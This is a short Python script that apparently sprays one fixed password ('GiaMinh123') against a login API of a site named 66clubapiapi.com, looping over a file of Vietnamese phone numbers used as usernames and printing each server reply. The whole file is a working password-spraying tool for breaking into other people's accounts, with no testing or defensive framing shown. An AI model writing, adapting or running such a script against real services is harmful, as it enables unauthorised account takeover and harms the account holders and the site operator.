import requests

file_path = "data/tk.txt"

with open(file_path, 'r') as file:
    phones = file.readlines()

i = 1

for phone in phones:
    param = {
        "username" : "+84" + phone.strip(),
        'pwd' : "GiaMinh123",
        'phonetype': "0",
        'language': 'vi'
    }

    response = requests.post('https://66clubapiapi.com/api/webapi/UserLogin', data=param)
    response = response.json()
    print(str(i) + ": " + response['msg'])
    i = i + 1
